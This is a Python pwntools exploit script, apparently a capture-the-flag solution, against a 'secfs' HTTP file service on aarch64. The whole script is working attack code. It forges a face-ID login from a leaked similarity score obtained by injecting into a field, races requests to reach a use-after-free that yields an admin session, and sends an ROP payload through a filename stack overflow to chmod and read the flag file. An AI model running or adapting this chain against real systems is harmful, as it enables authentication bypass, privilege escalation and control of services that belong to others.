from pwn import *
from urllib.parse import urlencode, quote
import threading
import sys
import json
import struct
import os
import time

context.arch = "aarch64"
context.log_level = "debug"

if len(sys.argv) != 3:
    print("python3 exp.py ip port")
ip = sys.argv[1]
port = int(sys.argv[2])

def get_conn():
    return remote(ip, port)

def make_post_request(path, body, session_id=None):
    if isinstance(session_id, str):
        session_id = session_id.encode()
    if isinstance(body, str):
        body = body.encode()    
    p = get_conn()
    req = b"POST " + path.encode() + b" HTTP/1.1\r\n"
    req += b"Content-Length: "+ str(len(body)).encode() + b"\r\n"
    if session_id:
        req += b"Cookie: session_id="+ session_id + b";\r\n"
    req += b"\r\n"
    req += body
    p.send(req)
    return p

def leak_similarity(face_data:list):
    done = 0
    similarity = 0.0
    while(done == 0):
        try:
            body = f"auth_mode=face_id&username=eqqie%09get_similarity&face_data={str(face_data)}".encode()
            p = make_post_request("/api/login", body)
            p.recvuntil(b"HTTP/1.1 ")
            if(p.recv(3) == b"400"):
                print("Try leak again...")
                p.close()
                done = 0
                continue
            p.recvuntil(b"session_id=")
            leak = p.recvuntil(b"; ", drop=True).decode()
            p.close()
            similarity = float(leak)
            done = 1
        except KeyboardInterrupt:
            print("KeyboardInterrupt")
            sys.exit(0)
        except Exception as e:
            print("leak error:", e)
            p.close()
    return similarity
   
def login_by_face(face_data:list):
    args = {
        "auth_mode": "face_id",
        "username": "eqqie",
        "face_data": str(face_data)
    }
    body = urlencode(args).encode()
    p = make_post_request("/api/login", body)
    p.recvuntil(b"session_id=")
    session_id = p.recvuntil(b"; Path", drop=True).decode()
    p.close()
    return session_id
    
def login_by_passwd(username, password):
    args = {
        "auth_mode": "passwd",
        "username": username,
        "password": password
    }
    body = urlencode(args).encode()
    try:
        p = make_post_request("/api/login", body)
        p.recvuntil(b"session_id=")
        session_id = p.recvuntil(b"; Path", drop=True).decode()
        p.close()
    except:
        print("no session!")
        session_id = None
    return session_id
    
def disable_user(session_id, user):
    if isinstance(session_id, str):
        session_id = session_id.encode()
    args = {
        "username": user
    }
    body = urlencode(args).encode()
    p = make_post_request("/api/man/user/disable", body, session_id)
    p.recv()
    p.close()
    
def enable_user(session_id, user):
    if isinstance(session_id, str):
        session_id = session_id.encode()
    args = {
        "username": user
    }
    body = urlencode(args).encode()
    p = make_post_request("/api/man/user/enable", body, session_id)
    p.recv()
    p.close()
    
def reset_user(session_id, user, face_data=None):
    if isinstance(session_id, str):
        session_id = session_id.encode()
    if not face_data:
        args = {
            "username": user
        }
    else:
        args = {
            "username": user,
            "option": "set_face_id",
            "face_data": str(face_data)
        }        
    body = urlencode(args).encode()
    p = make_post_request("/api/man/user/reset", body, session_id)
    p.recv()
    p.close()
    
def test_race_resule(session_id):
    if isinstance(session_id, str):
        session_id = session_id.encode()
    p = make_post_request("/api/user", b"", session_id)
    p.recvuntil(b"HTTP/1.1 ")
    http_status = p.recv(3)
    p.close()
    if http_status == b"200":
        return 0
    elif http_status == b"403":
        remain = p.recv()
        if b"Disabled User" in remain:
            return 2
        else:
            return 1
            
def user_info(session_id):
    if isinstance(session_id, str):
        session_id = session_id.encode()
    p = make_post_request("/api/user", b"", session_id)
    p.recvuntil(b"HTTP/1.1 ")
    http_status = p.recv(3)
    if http_status == b"200":
        try:
            p.recvuntil(b"Connection: close\r\n\r\n")
            p.close()
            json_data = p.recvall().decode()
            return json.loads(json_data)
        except:
            p.close()
            return None
    else:
        p.close()
        return None 
        
def secfs_file_man(action: str, session_id: str, **kwargs):
    print(f"[*] secfs_file_man: action [{action}] with args [{kwargs}]")
    if isinstance(session_id, str):
        session_id = session_id.encode()
    if action == "create":
        body = f"filename={kwargs['filename']}&data={kwargs['data']}&parent_id={kwargs['parent_id']}".encode()
        p = make_post_request("/api/secfs/file/create", body, session_id)
        p.recvuntil(b"\r\n\r\n")
        ret_data = p.recv()
        p.close()
    elif action == "delete":
        body = f"ext_id={kwargs['ext_id']}&del_mode={kwargs['del_mode']}".encode()
        p = make_post_request("/api/secfs/file/delete", body, session_id)
        p.recvuntil(b"\r\n\r\n")
        ret_data = p.recv()
        p.close()
    elif action == "info":
        body = f"ext_id={kwargs['ext_id']}".encode()
        p = make_post_request("/api/secfs/file/info", body, session_id)
        p.recvuntil(b"\r\n\r\n")
        ret_data = p.recv()
        p.close()
    elif action == "read":
        body = f"ext_id={kwargs['ext_id']}".encode()
        p = make_post_request("/api/secfs/file/read", body, session_id)
        ret_data = p.recv()
        p.close()
    elif action == "rename":
        body = f"ext_id={kwargs['ext_id']}&new_filename={kwargs['new_filename']}".encode()
        p = make_post_request("/api/secfs/file/rename", body, session_id)
        p.recvuntil(b"\r\n\r\n")
        ret_data = p.recv()
        p.close()
    elif action == "update":
        body = f"ext_id={kwargs['ext_id']}&data={kwargs['data']}".encode()
        p = make_post_request("/api/secfs/file/update", body, session_id)
        p.recvuntil(b"\r\n\r\n")
        ret_data = p.recv()
        p.close()
    elif action == "slots":
        p = make_post_request("/api/secfs/file/slots", b"", session_id)
        p.recvuntil(b"\r\n\r\n")
        ret_data = p.recv()
        p.close()
    else:
        return None
    return ret_data
    
def secfs_dir_man(action: str, session_id: str, **kwargs):
    print(f"[*] secfs_dir_man: action [{action}] with args [{kwargs}]")
    if isinstance(session_id, str):
        session_id = session_id.encode()
    if action == "create":
        body = f"parent_id={kwargs['parent_id']}&dir_name={kwargs['dir_name']}".encode()
        p = make_post_request("/api/secfs/dir/create", body, session_id)
        p.recvuntil(b"\r\n\r\n")
        ret_data = p.recv()
        p.close()
    elif action == "delete":
        body = f"ext_id={kwargs['ext_id']}&rm_mode={kwargs['rm_mode']}".encode()
        p = make_post_request("/api/secfs/dir/delete", body, session_id)
        p.recvuntil(b"\r\n\r\n")
        ret_data = p.recv()
        p.close()
    elif action == "info":
        body = f"ext_id={kwargs['ext_id']}".encode()
        p = make_post_request("/api/secfs/dir/info", body, session_id)
        p.recvuntil(b"\r\n\r\n")
        ret_data = p.recv()
        p.close()      
    else:
        return None
    return ret_data
    
def forge_face_id(size:int):
    fake_face = [0.0 for _ in range(size)]
    rounds = 0
    total_max = 0.0
    delta = 0.025
    burp_range = 20
    while True:
        for i in range(size):
            local_max = 0.0
            max_index = 0
            for j in range(-burp_range, burp_range):
                rounds += 1
                fake_face[i] = j * delta
                print(fake_face)
                curr = leak_similarity(fake_face)
                if curr >= local_max:
                    local_max = curr
                    max_index = j
                else:
                    break
            fake_face[i] = max_index * delta
            total_max = leak_similarity(fake_face)
            time.sleep(0.01)
        if total_max > 0.85:
            print("Success!")
            break
        else:
            print("Fail!")
            return None
    print(f"Final similarity = {total_max}, rounds = {rounds}")
    return fake_face


class MyThread(threading.Thread):
    def __init__(self, func, args=()):
        super(MyThread, self).__init__()
        self.func = func
        self.args = args
    def run(self):
        self.result = self.func(*self.args)
    def get_result(self):
        threading.Thread.join(self)
        try:
            return self.result
        except Exception:
            return None

def race_and_uaf(session_id):
    uaf_face_data = [1.0]*128
    uaf_face_data[88] = struct.unpack("<d", b"user"+p32(2333))[0]
    uaf_face_data[89] = struct.unpack("<d", p64(0))[0]
    uaf_face_data[90] = struct.unpack("<d", b"AAAABBBB")[0]
    
    eqqie_session = session_id
    disable_user(eqqie_session, "guest")
    reset_user(eqqie_session, "guest")
    enable_user(eqqie_session, "guest")
    guest_session = login_by_passwd("guest", "password")
    print("guest_session:", guest_session)
    usable_session = None
    for _ in range(500):
        ta = MyThread(func=disable_user, args=(eqqie_session, "guest"))
        tb = MyThread(func=login_by_passwd, args=("guest", "password"))
        ta.start()
        tb.start()
        ta.join()
        tb.join()
        guest_session = tb.get_result() 
        if guest_session:
            if(test_race_resule(guest_session) == 2):
                usable_session = guest_session
                print("Race success:", usable_session)
                reset_user(eqqie_session, "guest")
                reset_user(eqqie_session, "guest", uaf_face_data)
                break
        enable_user(eqqie_session, "guest")
    if not usable_session:
        print("Race fail!")
        return
    json_data = user_info(usable_session)
    if json_data:
        if json_data['data']['type'] == 'admin':
            print("UAF success!")
            return usable_session
        else:
            print('UAF Fail!')
            return None
    else:
        print("no json data!")
        return None
   
def name_stkof(session_id):
    for i in range(127):
        json_ret = secfs_dir_man("create", session_id, dir_name=f"dir_{i}", parent_id=0)
        json_ret = json.loads(json_ret.decode())
        if(json_ret['code'] == 0):
            secfs_dir_man("delete", session_id, ext_id=json_ret['data']['ext_id'], rm_mode='recur')
        else:
            continue
    secfs_file_man("slots", session_id)
    
    flag_str = 0x409E58
    perm_val = 0x1F6
    chmod_got = 0x41AEC8
    gadget1 = 0x409D88
    gadget2 = 0x409D68

    rop = p64(gadget1)+b"x"*0x30
    rop += p64(0xdeadbeef) + p64(gadget2)   # x29       x30
    rop += p64(0) + p64(1)                  # x19       x20
    rop += p64(chmod_got) + p64(flag_str)   # x21       x22(w0)
    rop += p64(perm_val) + p64(0xdeadbeef)  # x23(x1)   x24

    payload1 = "a"*(0x214)+"b"*len(rop) # occupy file data to expand file name size
    json_ret = secfs_file_man("create", session_id, filename=f"vuln_file", data=payload1, parent_id=0)
    json_ret = json.loads(json_ret.decode())
    secfs_file_man("rename", session_id, ext_id=json_ret['data']['ext_id'], new_filename="A"*128)
    payload2 = "a"*(0x214)+quote(rop)
    secfs_file_man("update", session_id, ext_id=json_ret['data']['ext_id'], data=payload2)
    secfs_file_man("info", session_id, ext_id=json_ret['data']['ext_id'])

def exp():
    # step 1
    fake_face = forge_face_id(128)
    print("fake face id:", fake_face)
    eqqie_session = login_by_face(fake_face)
    print("eqqie_session:", eqqie_session)
    # step 2
    admin_session = race_and_uaf(eqqie_session)
    print("admin_session:", admin_session)
    # step 3
    name_stkof(admin_session)
    # read_flag
    os.system(f"curl http://{ip}:{port}/flag.txt")
    
if __name__ == "__main__":
    exp()

